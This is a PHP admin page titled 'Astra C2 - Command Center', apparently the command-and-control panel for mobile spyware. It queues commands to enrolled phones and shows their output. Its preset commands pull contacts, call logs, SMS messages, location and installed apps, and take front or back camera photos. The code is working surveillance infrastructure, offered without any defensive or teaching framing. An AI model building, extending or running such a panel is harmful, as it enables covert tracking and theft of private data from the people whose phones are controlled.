<?php
/**
 * Admin Panel - Command Center
 * For sending commands to devices
 */

// Define included constant to prevent direct access to includes
define('INCLUDED', true);

// Include required files
require_once '../includes/db.php';
require_once '../includes/functions.php';

// Start session
session_start();

// Check if admin is authenticated
if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
    header('Location: index.php');
    exit;
}

// Connect to database
$db = Database::getInstance();

// Handle command submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['send_command'])) {
    $deviceId = sanitizeInput($_POST['device_id']);
    $command = sanitizeInput($_POST['command']);
    
    if (empty($deviceId) || empty($command)) {
        $message = "Device and command are required";
        $messageType = "danger";
    } else {
        // Check if device exists
        $checkStmt = $db->executeQuery(
            "SELECT COUNT(*) FROM devices WHERE device_id = ?",
            "s",
            [$deviceId]
        );
        
        if ($checkStmt === false) {
            $message = "Failed to verify device";
            $messageType = "danger";
        } else {
            $result = $checkStmt->get_result();
            $deviceExists = $result->fetch_row()[0] > 0;
            $checkStmt->close();
            
            if (!$deviceExists) {
                $message = "Device not found";
                $messageType = "danger";
            } else {
                // Insert command
                $stmt = $db->executeQuery(
                    "INSERT INTO commands (device_id, command, issued_at, status, output) VALUES (?, ?, NOW(), 'pending', '')",
                    "ss",
                    [$deviceId, $command]
                );
                
                if ($stmt === false) {
                    $message = "Failed to send command";
                    $messageType = "danger";
                } else {
                    $commandId = $stmt->insert_id;
                    $stmt->close();
                    
                    $message = "Command sent successfully";
                    $messageType = "success";
                    
                    // Log the command
                    logMessage("Command sent to device $deviceId: $command (ID: $commandId)");
                }
            }
        }
    }
}

// Get pre-selected device ID from query parameter (if any)
$selectedDeviceId = isset($_GET['device_id']) ? sanitizeInput($_GET['device_id']) : '';

// Get devices for dropdown
$devicesStmt = $db->executeQuery("SELECT device_id, name, last_seen FROM devices ORDER BY name");
if ($devicesStmt === false) {
    $devices = [];
} else {
    $devicesResult = $devicesStmt->get_result();
    $devices = [];
    while ($row = $devicesResult->fetch_assoc()) {
        $row['is_online'] = strtotime($row['last_seen']) >= strtotime('-10 minutes');
        $devices[] = $row;
    }
    $devicesStmt->close();
}

// Get command history with pagination
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$perPage = 10;
$offset = ($page - 1) * $perPage;

// Only filter by device if one is selected
$historyQuery = "SELECT c.id, c.device_id, d.name as device_name, c.command, c.issued_at, c.status, c.output 
                FROM commands c
                JOIN devices d ON c.device_id = d.device_id";

$countParams = [];
$historyParams = [];
$types = "";

if (!empty($selectedDeviceId)) {
    $historyQuery .= " WHERE c.device_id = ?";
    $countParams[] = $selectedDeviceId;
    $historyParams[] = $selectedDeviceId;
    $types .= "s";
}

$historyQuery .= " ORDER BY c.issued_at DESC LIMIT ?, ?";
$historyParams[] = $offset;
$historyParams[] = $perPage;
$types .= "ii";

// Get total command count for pagination
$countQuery = "SELECT COUNT(*) FROM commands";

if (!empty($selectedDeviceId)) {
    $countQuery .= " WHERE device_id = ?";
}

$countStmt = $db->executeQuery($countQuery, !empty($selectedDeviceId) ? "s" : "", $countParams);
if ($countStmt === false) {
    $totalCommands = 0;
} else {
    $totalCommands = $countStmt->get_result()->fetch_row()[0];
    $countStmt->close();
}

$totalPages = ceil($totalCommands / $perPage);

// Get command history
$historyStmt = $db->executeQuery($historyQuery, $types, $historyParams);
if ($historyStmt === false) {
    $commandHistory = [];
} else {
    $historyResult = $historyStmt->get_result();
    $commandHistory = [];
    while ($row = $historyResult->fetch_assoc()) {
        $commandHistory[] = $row;
    }
    $historyStmt->close();
}

// Define common command templates
$commandTemplates = [
    'Device Info' => 'getinfo',
    'List Installed Apps' => 'listapps',
    'Battery Status' => 'battery',
    'Get Contacts' => 'contacts',
    'Recent Calls' => 'calls',
    'Current Location' => 'location',
    'Take Photo (Front Camera)' => 'photo front',
    'Take Photo (Back Camera)' => 'photo back',
    'List SMS' => 'sms list',
    'Network Info' => 'netinfo'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Astra C2 - Command Center</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/material-icons@1.13.6/iconfont/material-icons.min.css">
    <link rel="stylesheet" href="../assets/css/style.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-md-2 bg-dark sidebar">
                <div class="sidebar-header">
                    <h3 class="text-white">Astra C2</h3>
                </div>
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link" href="dashboard.php">
                            <i class="material-icons">dashboard</i> Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="devices.php">
                            <i class="material-icons">devices</i> Devices
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="logs.php">
                            <i class="material-icons">description</i> Logs
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="command_center.php">
                            <i class="material-icons">send</i> Command Center
                        </a>
                    </li>
                </ul>
            </div>
            
            <!-- Main content -->
            <div class="col-md-10 main-content">
                <div class="container">
                    <h1 class="mt-4 mb-4">Command Center</h1>
                    
                    <?php if (isset($message)): ?>
                    <div class="alert alert-<?php echo $messageType; ?> alert-dismissible fade show" role="alert">
                        <?php echo $message; ?>
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                    </div>
                    <?php endif; ?>
                    
                    <!-- Command Form -->
                    <div class="card mb-4">
                        <div class="card-header">
                            <h5 class="mb-0">Send Command</h5>
                        </div>
                        <div class="card-body">
                            <form action="command_center.php" method="post">
                                <div class="mb-3">
                                    <label for="device_id" class="form-label">Select Device</label>
                                    <select class="form-select" id="device_id" name="device_id" required>
                                        <option value="">-- Select Device --</option>
                                        <?php foreach ($devices as $device): ?>
                                        <option value="<?php echo htmlspecialchars($device['device_id']); ?>" <?php echo $selectedDeviceId === $device['device_id'] ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($device['name']); ?>
                                            <?php if ($device['is_online']): ?>
                                            <span class="text-success"> (Online)</span>
                                            <?php else: ?>
                                            <span class="text-secondary"> (Offline)</span>
                                            <?php endif; ?>
                                        </option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="command_template" class="form-label">Common Commands</label>
                                    <select class="form-select" id="command_template" onchange="insertTemplate(this.value)">
                                        <option value="">-- Select Template --</option>
                                        <?php foreach ($commandTemplates as $label => $cmd): ?>
                                        <option value="<?php echo htmlspecialchars($cmd); ?>"><?php echo htmlspecialchars($label); ?></option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="command" class="form-label">Command</label>
                                    <textarea class="form-control" id="command" name="command" rows="3" required placeholder="Enter command to execute on device"></textarea>
                                    <div class="form-text">
                                        Enter the command to send to the device. The command will be queued and executed when the device next polls for commands.
                                    </div>
                                </div>
                                
                                <button type="submit" name="send_command" class="btn btn-primary">Send Command</button>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Command History -->
                    <div class="card">
                        <div class="card-header d-flex justify-content-between align-items-center">
                            <h5 class="mb-0">Command History</h5>
                            <?php if (!empty($selectedDeviceId)): ?>
                            <a href="command_center.php" class="btn btn-sm btn-outline-secondary">Show All Devices</a>
                            <?php endif; ?>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                        <tr>
                                            <th>ID</th>
                                            <th>Device</th>
                                            <th>Command</th>
                                            <th>Issued At</th>
                                            <th>Status</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php if (empty($commandHistory)): ?>
                                        <tr>
                                            <td colspan="6" class="text-center">No commands have been issued</td>
                                        </tr>
                                        <?php else: ?>
                                        <?php foreach ($commandHistory as $cmd): ?>
                                        <tr>
                                            <td><?php echo $cmd['id']; ?></td>
                                            <td><?php echo htmlspecialchars($cmd['device_name']); ?></td>
                                            <td><?php echo htmlspecialchars(substr($cmd['command'], 0, 30) . (strlen($cmd['command']) > 30 ? '...' : '')); ?></td>
                                            <td><?php echo timeAgo($cmd['issued_at']); ?></td>
                                            <td>
                                                <?php if ($cmd['status'] === 'pending'): ?>
                                                <span class="badge bg-warning">Pending</span>
                                                <?php elseif ($cmd['status'] === 'in_progress'): ?>
                                                <span class="badge bg-info">In Progress</span>
                                                <?php else: ?>
                                                <span class="badge bg-success">Complete</span>
                                                <?php endif; ?>
                                            </td>
                                            <td>
                                                <button type="button" class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#viewModal<?php echo $cmd['id']; ?>">
                                                    <i class="material-icons">visibility</i>
                                                </button>
                                                
                                                <!-- View Modal -->
                                                <div class="modal fade" id="viewModal<?php echo $cmd['id']; ?>" tabindex="-1" aria-labelledby="viewModalLabel" aria-hidden="true">
                                                    <div class="modal-dialog modal-lg">
                                                        <div class="modal-content">
                                                            <div class="modal-header">
                                                                <h5 class="modal-title" id="viewModalLabel">Command Details</h5>
                                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                                            </div>
                                                            <div class="modal-body">
                                                                <div class="mb-3">
                                                                    <strong>Command ID:</strong> <?php echo $cmd['id']; ?>
                                                                </div>
                                                                <div class="mb-3">
                                                                    <strong>Device:</strong> <?php echo htmlspecialchars($cmd['device_name']); ?>
                                                                </div>
                                                                <div class="mb-3">
                                                                    <strong>Issued At:</strong> <?php echo formatTimestamp($cmd['issued_at']); ?>
                                                                </div>
                                                                <div class="mb-3">
                                                                    <strong>Status:</strong>
                                                                    <?php if ($cmd['status'] === 'pending'): ?>
                                                                    <span class="badge bg-warning">Pending</span>
                                                                    <?php elseif ($cmd['status'] === 'in_progress'): ?>
                                                                    <span class="badge bg-info">In Progress</span>
                                                                    <?php else: ?>
                                                                    <span class="badge bg-success">Complete</span>
                                                                    <?php endif; ?>
                                                                </div>
                                                                <div class="mb-3">
                                                                    <strong>Command:</strong>
                                                                    <pre class="bg-light p-3 mt-2"><?php echo htmlspecialchars($cmd['command']); ?></pre>
                                                                </div>
                                                                <?php if ($cmd['status'] === 'complete' && !empty($cmd['output'])): ?>
                                                                <div class="mb-3">
                                                                    <strong>Output:</strong>
                                                                    <pre class="bg-light p-3 mt-2"><?php echo htmlspecialchars($cmd['output']); ?></pre>
                                                                </div>
                                                                <?php endif; ?>
                                                            </div>
                                                            <div class="modal-footer">
                                                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                                                <?php if ($cmd['status'] === 'pending'): ?>
                                                                <button type="button" class="btn btn-primary" onclick="reissueCommand('<?php echo htmlspecialchars($cmd['device_id']); ?>', '<?php echo htmlspecialchars(str_replace("'", "\\'", $cmd['command'])); ?>')">
                                                                    Reissue Command
                                                                </button>
                                                                <?php endif; ?>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </td>
                                        </tr>
                                        <?php endforeach; ?>
                                        <?php endif; ?>
                                    </tbody>
                                </table>
                            </div>
                            
                            <!-- Pagination -->
                            <?php if ($totalPages > 1): ?>
                            <nav aria-label="Command history pagination">
                                <ul class="pagination justify-content-center mt-4">
                                    <li class="page-item <?php echo $page <= 1 ? 'disabled' : ''; ?>">
                                        <a class="page-link" href="?page=<?php echo $page - 1; ?><?php echo !empty($selectedDeviceId) ? '&device_id=' . htmlspecialchars($selectedDeviceId) : ''; ?>">Previous</a>
                                    </li>
                                    
                                    <?php
                                    $startPage = max(1, $page - 2);
                                    $endPage = min($totalPages, $page + 2);
                                    
                                    if ($startPage > 1) {
                                        echo '<li class="page-item"><a class="page-link" href="?page=1' . (!empty($selectedDeviceId) ? '&device_id=' . htmlspecialchars($selectedDeviceId) : '') . '">1</a></li>';
                                        if ($startPage > 2) {
                                            echo '<li class="page-item disabled"><span class="page-link">...</span></li>';
                                        }
                                    }
                                    
                                    for ($i = $startPage; $i <= $endPage; $i++) {
                                        echo '<li class="page-item ' . ($page == $i ? 'active' : '') . '"><a class="page-link" href="?page=' . $i . (!empty($selectedDeviceId) ? '&device_id=' . htmlspecialchars($selectedDeviceId) : '') . '">' . $i . '</a></li>';
                                    }
                                    
                                    if ($endPage < $totalPages) {
                                        if ($endPage < $totalPages - 1) {
                                            echo '<li class="page-item disabled"><span class="page-link">...</span></li>';
                                        }
                                        echo '<li class="page-item"><a class="page-link" href="?page=' . $totalPages . (!empty($selectedDeviceId) ? '&device_id=' . htmlspecialchars($selectedDeviceId) : '') . '">' . $totalPages . '</a></li>';
                                    }
                                    ?>
                                    
                                    <li class="page-item <?php echo $page >= $totalPages ? 'disabled' : ''; ?>">
                                        <a class="page-link" href="?page=<?php echo $page + 1; ?><?php echo !empty($selectedDeviceId) ? '&device_id=' . htmlspecialchars($selectedDeviceId) : ''; ?>">Next</a>
                                    </li>
                                </ul>
                            </nav>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="../assets/js/dashboard.js"></script>
    <script>
        function insertTemplate(command) {
            if (command) {
                document.getElementById('command').value = command;
            }
        }
        
        function reissueCommand(deviceId, command) {
            document.getElementById('device_id').value = deviceId;
            document.getElementById('command').value = command;
            window.scrollTo(0, 0);
        }
    </script>
</body>
</html>
